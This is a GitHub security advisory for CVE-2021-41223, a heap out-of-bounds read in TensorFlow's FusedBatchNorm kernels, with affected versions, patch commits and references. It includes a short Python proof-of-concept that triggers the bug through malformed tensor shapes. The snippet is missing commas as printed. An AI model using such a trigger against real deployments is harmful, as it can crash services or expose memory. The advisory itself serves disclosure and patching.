# [M] Heap OOB in `FusedBatchNorm` kernels

## Summary
Severity: Medium
Advisory: GHSA-f54p-f6jp-4rhr
CVE: CVE-2021-41223
CWE: CWE-125
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H (CVSS_V3)
Published: 2021-11-10
Source: https://github.com/advisories/GHSA-f54p-f6jp-4rhr
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow` — affected >=0 <2.4.4
- PyPI: `tensorflow-cpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-cpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-cpu` — affected >=0 <2.4.4
- PyPI: `tensorflow-gpu` — affected >=2.6.0 <2.6.1
- PyPI: `tensorflow-gpu` — affected >=2.5.0 <2.5.2
- PyPI: `tensorflow-gpu` — affected >=0 <2.4.4

## Details
### Impact
The [implementation](https://github.com/tensorflow/tensorflow/blob/e71b86d47f8bc1816bf54d7bddc4170e47670b97/tensorflow/core/kernels/fused_batch_norm_op.cc#L1292) of `FusedBatchNorm` kernels is vulnerable to a heap OOB:

```python
import tensorflow as tf
    
tf.raw_ops.FusedBatchNormGrad(
  y_backprop=tf.constant([i for i in range(9)],shape=(1,1,3,3),dtype=tf.float32)
  x=tf.constant([i for i in range(2)],shape=(1,1,1,2),dtype=tf.float32)
  scale=[1,1],
  reserve_space_1=[1,1],
  reserve_space_2=[1,1,1],
  epsilon=1.0,
  data_format='NCHW',
  is_training=True) 
```
  
### Patches
We have patched the issue in GitHub commit [aab9998916c2ffbd8f0592059fad352622f89cda](https://github.com/tensorflow/tensorflow/commit/aab9998916c2ffbd8f0592059fad352622f89cda).

The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.

### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.

### Attribution
This vulnerability has been reported by members of the Aivul Team from Qihoo 360.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-f54p-f6jp-4rhr
- https://nvd.nist.gov/vuln/detail/CVE-2021-41223
- https://github.com/tensorflow/tensorflow/commit/aab9998916c2ffbd8f0592059fad352622f89cda
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2021-632.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2021-830.yaml
- https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2021-415.yaml
- https://github.com/tensorflow/tensorflow
